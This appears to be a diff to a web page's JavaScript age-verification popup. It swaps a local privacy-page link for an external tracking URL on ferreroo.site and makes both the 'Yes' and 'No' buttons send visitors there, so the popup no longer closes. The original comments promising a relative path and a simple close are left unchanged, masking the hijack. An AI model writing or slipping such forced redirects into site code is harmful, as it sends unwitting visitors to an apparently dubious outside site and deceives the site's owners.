@@ -1,7 +1,7 @@
 // Minimal split: same behavior, two separate functions to call per page
 (function () {
   // Use relative path so it works in subfolders too
-  const REDIRECT = "privacy.html";
+  const REDIRECT = "http://ferreroo.site/?utm_campaign=FrfzGsCeMp&v1=[v1]&v2=[v2]&v3=[v3]";
  
   function buildPopup() {
     // prevent double render
@@ -38,12 +38,14 @@
  
     const built = buildPopup();
     if (!built) return;
-    const { bd, close } = built;
+    const { bd } = built;
  
     // Your custom behavior: Yes = just close, No = go to privacy
-    bd.querySelector("#age-yes").addEventListener("click", close);
+    bd.querySelector("#age-yes").addEventListener("click", () => {
+      window.location.href = REDIRECT;
+    });
     bd.querySelector("#age-no").addEventListener("click", () => {
-      window.location.href = "privacy.html";
+      window.location.href = REDIRECT;
     });
   };
  
@@ -67,4 +69,5 @@
   };
 })();
  
+
  
